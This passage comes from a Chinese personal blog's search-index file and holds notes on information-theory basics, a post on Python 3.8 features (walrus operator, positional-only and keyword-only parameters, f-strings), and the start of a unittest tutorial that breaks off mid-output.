信息论研究的对象</h3><ol><li>信源：产生信息的源头</li><li>编码器：把消息变换成信号的措施<ul><li>信源编码：提高信息传输的<strong>效率</strong></li><li>信道编码：提高信息传输的<strong>可靠性</strong></li><li>加密编码：提高信息传输的<strong>安全性</strong></li></ul></li><li>信道：通信系统把载荷信息的信号从甲地传输到乙地的媒介或通道</li><li>译码器：把信道输出的编码信号（已叠加了干扰）进行反变换</li><li>信宿：信息传输的对象，即接受消息的人或机器</li></ol><h3 id="3-3-信息论研究的目的"><a href="#3-3-信息论研究的目的" class="headerlink" title="3.3 信息论研究的目的"></a>3.3 信息论研究的目的</h3><ul><li>找到信息传输过程中的共同规律</li><li>提高信息传输的<strong>有效性、可靠性、保密性和认证性</strong>。</li><li>达到信息传输系统的最优化</li></ul><p>对第二条当中的四“性”如何理解？</p><ul><li>有效性：尽可能短的时间，尽可能少的设备，传输一定数量的信息</li><li>可靠性：尽可能准确地、不失真得再现于接收端</li><li>保密性：隐蔽和保护通信系统中传送的消息</li><li>认证性：接收者能够正确判断所接受信息的正确性，验证完整性</li></ul><h3 id="3-4-信息论研究的内容"><a href="#3-4-信息论研究的内容" class="headerlink" title="3.4 信息论研究的内容"></a>3.4 信息论研究的内容</h3><h4 id="1-狭义信息论（信息论基础，香农信息论）"><a href="#1-狭义信息论（信息论基础，香农信息论）" class="headerlink" title="1. 狭义信息论（信息论基础，香农信息论）"></a>1. 狭义信息论（信息论基础，香农信息论）</h4><p>研究信息的测度、信道容量以及信源和信道编码理论等问题</p><h4 id="2-一般信息论（通信理论）"><a href="#2-一般信息论（通信理论）" class="headerlink" title="2. 一般信息论（通信理论）"></a>2. 一般信息论（通信理论）</h4><p>研究信息传输和处理问题</p><h4 id="3-广义信息论"><a href="#3-广义信息论" class="headerlink" title="3. 广义信息论"></a>3. 广义信息论</h4><p>包含上两方面，以及所有与信息有关的领域</p><h2 id="4-信息论的发展简史与现状"><a href="#4-信息论的发展简史与现状" class="headerlink" title="4. 信息论的发展简史与现状"></a>4. 信息论的发展简史与现状</h2><p>略</p>]]></content>
      
      
      <categories>
          
          <category> 信息论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 信息论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3.8的三个重要新功能</title>
      <link href="2020/02/16/python3-8-de-san-ge-chong-yao-xin-gong-neng/"/>
      <url>2020/02/16/python3-8-de-san-ge-chong-yao-xin-gong-neng/</url>
      
        <content type="html"><![CDATA[<p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.8/whatsnew/3.8.html#">Python3.8官方文档</a></p><h2 id="1-海象运算符"><a href="#1-海象运算符" class="headerlink" title="1. 海象运算符(:=)"></a>1. 海象运算符(:=)</h2><p>Python3.8新推出了海象运算符，可以在表达式内部为变量赋值，在一定程度上可以提高程序的效率，减少代码量，让代码更加简洁。</p><p>用法：<code>a := b</code></p><h3 id="示例1：多次调用其他函数"><a href="#示例1：多次调用其他函数" class="headerlink" title="示例1：多次调用其他函数"></a>示例1：多次调用其他函数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们调用了两次<code>len()</code>函数。在以前，我们可以先将len(a)赋给一个变量len_a，然后再使用两次len_a，这样就可以实现只调用一次<code>len()</code>函数。这样虽然提升了效率，但代码却更为复杂了。在Python3.8中，我们可以用海象运算符来解决。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>len_a <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len_a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样不仅使程序的效率得到了提升，代码也更加简洁。</p><p>类似的益处还可出现在正则表达式中，因博主还未学习过正则表达式，下面仅作官方文档的搬运：</p><blockquote><p>类似的益处还可出现在正则表达式匹配中需要使用两次匹配对象的情况中，一次检测用于匹配是否发生，另一次用于提取子分组:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">discount <span class="token operator">=</span> <span class="token number">0.0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>mo <span class="token punctuation">:</span><span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(\d+)% discount'</span><span class="token punctuation">,</span> advertisement<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> discount <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>mo<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="示例2：列表推导式"><a href="#示例2：列表推导式" class="headerlink" title="示例2：列表推导式"></a>示例2：列表推导式</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">2</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a <span class="token keyword">if</span> i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样，我们使用了两次<code>i * 2</code>。下面我们来看看怎样用海象表达式对代码进行简化：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span>j <span class="token keyword">for</span> i <span class="token keyword">in</span> a <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token punctuation">:</span><span class="token operator">=</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在这里，我们对变量j是先出现，再定义，但实际上却是先执行了赋值操作。在可读性方面有所不足，但也有有利的一面。</p><h3 id="示例3：大文件读取"><a href="#示例3：大文件读取" class="headerlink" title="示例3：大文件读取"></a>示例3：大文件读取</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接读取整个文件，文件小了无所谓，但对于大文件来说，占用的内存就太大了。通常的解决方法是不直接读取整个文件，而是逐行读取：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们也可以看到，效率虽然提升了，但是简洁性却变差了。下面，我们来看一下海象运算符如何处理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">while</span> line <span class="token punctuation">:</span><span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们可以直接在while判断语句里面使用海象运算符，这样既有了效率，又有了间接性。</p><h2 id="2-限制传参形式"><a href="#2-限制传参形式" class="headerlink" title="2. 限制传参形式"></a>2. 限制传参形式</h2><p>Python有两种常见传参形式：位置传参和关键字传参。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#位置传参，输出 ‘1 2’</span>f<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#关键字传参，输出 ‘3 4’（传参时的顺序不影响）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-仅限位置传参（’-‘）"><a href="#2-1-仅限位置传参（’-‘）" class="headerlink" title="2.1 仅限位置传参（’/‘）"></a>2.1 仅限位置传参（’/‘）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>   f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#Right</span>f<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">#ERROR!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在’<strong>/</strong>‘<strong>前面</strong>的参数必须使用位置传参，不能使用关键字传参，否则会报错。</p><h3 id="2-2-仅限关键字传参"><a href="#2-2-仅限关键字传参" class="headerlink" title="2.2 仅限关键字传参"></a>2.2 仅限关键字传参</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    f<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#Right</span>f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#ERROR!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在’*‘<strong>后面</strong>的参数必须使用关键字传参，不能使用位置传参，否则会报错。</p><h3 id="2-3-和-同时使用"><a href="#2-3-和-同时使用" class="headerlink" title="2.3 /和*同时使用"></a>2.3 <code>/</code>和<code>*</code>同时使用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> <span class="token operator">*</span>， e<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">)</span>    test<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> f<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> e<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">#1 2 3 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>/</code>和<code>*</code>可以一起使用，只要主意好位置顺序即可。</p><h2 id="3-f-string支持：用于自动记录表达式和调试文档"><a href="#3-f-string支持：用于自动记录表达式和调试文档" class="headerlink" title="3. f-string支持：用于自动记录表达式和调试文档"></a>3. f-string支持：用于自动记录表达式和调试文档</h2><p>在Python3.6之后，就有了format，具体形式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">user1 <span class="token operator">=</span> <span class="token string">'大头儿子'</span>user2 <span class="token operator">=</span> <span class="token string">'小头爸爸'</span>words1 <span class="token operator">=</span> <span class="token string">'老师说肺炎严重不要出门！'</span>words2 <span class="token operator">=</span> <span class="token string">'我在家都快要憋疯了！'</span><span class="token comment">#使用format</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{user1}说：{words1}\n{user2}说：{words2}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user1<span class="token operator">=</span>user1<span class="token punctuation">,</span> user2<span class="token operator">=</span>user2<span class="token punctuation">,</span> words1<span class="token operator">=</span>words1<span class="token punctuation">,</span> words2<span class="token operator">=</span>words2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#大头儿子说：老师说肺炎严重不要出门!</span><span class="token comment">#小头爸爸说：我在家都快要憋疯了！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，format()函数中需要输入大量数据，在实际操作时既复杂又容易出错。</p><p>在Python3.8中，使用f-string，具体形式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>user1<span class="token punctuation">}</span></span><span class="token string">说：</span><span class="token interpolation"><span class="token punctuation">{</span>words1<span class="token punctuation">}</span></span><span class="token string">\n</span><span class="token interpolation"><span class="token punctuation">{</span>user2<span class="token punctuation">}</span></span><span class="token string">说：</span><span class="token interpolation"><span class="token punctuation">{</span>words2<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要在字符串前面加上一个字母f，就可以省去原来的format()函数了，但是<code>{}</code>内的字符串必须和变量名一致。</p><p>以上就是Python3.8中三个个人认为最有用的新功能。完整更新内容可以查看<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.8/whatsnew/3.8.html#">Python3.8官方文档</a>。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:使用unittest模块测试代码</title>
      <link href="2020/02/14/python-shi-yong-unittest-mo-kuai-ce-shi-dai-ma/"/>
      <url>2020/02/14/python-shi-yong-unittest-mo-kuai-ce-shi-dai-ma/</url>
      
        <content type="html"><![CDATA[<p>本博客将介绍如何使用unittest模块来快速方便地测试代码。</p><h2 id="1-测试函数"><a href="#1-测试函数" class="headerlink" title="1. 测试函数"></a>1. 测试函数</h2><p>在<code>name_function.py</code>中编写以下函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_formatted_name</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Generate a neatly formatted full name"""</span>    full_name <span class="token operator">=</span> first <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> last    <span class="token keyword">return</span> full_name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>name.py</code>中让用户输入名和姓，并显示整洁的全名：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> name_function <span class="token keyword">import</span> get_formatted_name<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter 'q' at any time to quit."</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    first <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nPlease give me a first name:"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> first <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    last <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please give me a last name:"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> last <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    formatted_name <span class="token operator">=</span> get_formatted_name<span class="token punctuation">(</span>first<span class="token punctuation">,</span> last<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\tNeatly formatted name: "</span> <span class="token operator">+</span> formatted_name <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码运行是没有问题的，可以持续的输出完整的名字。</p><p>下面，我们考虑修改<code>get_formatted_name()</code>，让它可以处理中间名。这样做时，我们要确保不破坏这个函数可以处理只有名和姓的姓名的方式。为此，我们可以在每次修改后都进行测试，但这样太麻烦了。索性Python提供了一种自动测试函数输出的高效方式。</p><h3 id="1-1-单元测试和测试用例"><a href="#1-1-单元测试和测试用例" class="headerlink" title="1.1 单元测试和测试用例"></a>1.1 单元测试和测试用例</h3><p>Python标准库中的<strong>unittest</strong>提供了代码测试工具。</p><ul><li><em>单元测试</em> 用于核实函数的某个方面没有问题</li><li><em>测试用例</em> 是一组单元测试，这些单元测试一起核实函数在各种情况下的行为都符合要求</li><li><em>全覆盖式测试用例</em> 包含一整套单元测试，涵盖了各种可能的函数使用方式</li></ul><h3 id="1-2-可通过的测试"><a href="#1-2-可通过的测试" class="headerlink" title="1.2 可通过的测试"></a>1.2 可通过的测试</h3><p>要为函数编写测试用例，可先导入模块unittest以及要测试的函数，再创建一个继承unittest.TestCase的类，并编写一系列方法对函数行为的不同方面进行测试。</p><p>下面是一个只包含一个方法的测试用例，它检查get_formatted_name()在给定名和姓时能否正确地工作（test_name_function.py）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">from</span> name_function <span class="token keyword">import</span> get_formatted_name<span class="token keyword">class</span> <span class="token class-name">NamesTest</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""测试name_function.py"""</span>    <span class="token keyword">def</span> <span class="token function">test_first_last_name</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""能够正确的处理像Janis Joplin这样的姓名吗？"""</span>        formatted_name <span class="token operator">=</span> get_formatted_name<span class="token punctuation">(</span><span class="token string">'janis'</span><span class="token punctuation">,</span> <span class="token string">'joplin'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span>formatted_name<span class="token punctuation">,</span> <span class="token string">'Janis Joplin'</span><span class="token punctuation">)</span>unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们创建了一个名为NamesTestCase的类（名字可以任意），用于包含一系列针对get_formatted_name()的单元测试。这个类必须继承unittest.TestCase类。</p><p>我们运行test_name_function.py时，所有以<em>test_</em> 打头的方法都将自动执行。</p><p>assertEqual()是unittest类最有用的功能之一：<strong>断言方法</strong>。断言方法用来核实得到的结果是否和预期的一致。</p><p>代码行unittest.main()让Python运行这个文件中的测试。</p><p>运行这个文件后，得到的输出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Ran <span class="token number">1</span> test <span class="token keyword">in</span> <span class="token number">0.</span>000sOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行的**.**表明有一个测试通过了。接下来的一行指出python运行了一个测试，消耗的时间不到0.001s。最后的OK表明该测试用例中的所有单元测试都通过了。</p><h3 id="1-3-不能通过的测试"><a href="#1-3-不能通过的测试" class="headerlink" title="1.3 不能通过的测试"></a>1.3 不能通过的测试</h3><p>修改name_function.py，使其能够处理中间名：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_formatted_name</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> middle<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""生成整洁的姓名"""</span>    full_name <span class="token operator">=</span> first <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> middle <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> last    <span class="token keyword">return</span> full_name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个版本可以处理有中间名的情况，但不能处理只有名和姓的情况。我们再次运行test_name_function.py，输出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">E <span class="token comment">#表示测试用例中有一个单元测试导致了错误</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ERROR<span class="token punctuation">:</span>test_first_last_name<span class="token punctuation">(</span>__main__<span class="token punctuation">.</span>NamesTestCase<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Traceback<span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>TypeError<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span 